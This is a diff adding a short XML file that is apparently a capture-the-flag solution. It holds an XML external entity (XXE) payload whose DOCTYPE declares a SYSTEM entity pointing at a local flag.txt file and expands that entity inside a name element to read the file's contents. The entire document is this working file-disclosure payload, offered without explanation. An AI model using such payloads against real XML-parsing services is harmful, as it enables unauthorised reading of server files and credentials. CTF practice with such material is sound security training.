@@ -1,0 +1,6 @@
+<?xml version="1.0" standalone="no" ?>
+<!DOCTYPE root [<!ENTITY file SYSTEM "/Users/sambrow/hack/wolvsec_ctf_2021/docker/5/flag.txt">]>
+<root>
+    <name>&file;</name>
+    <color>blue</color>
+</root>
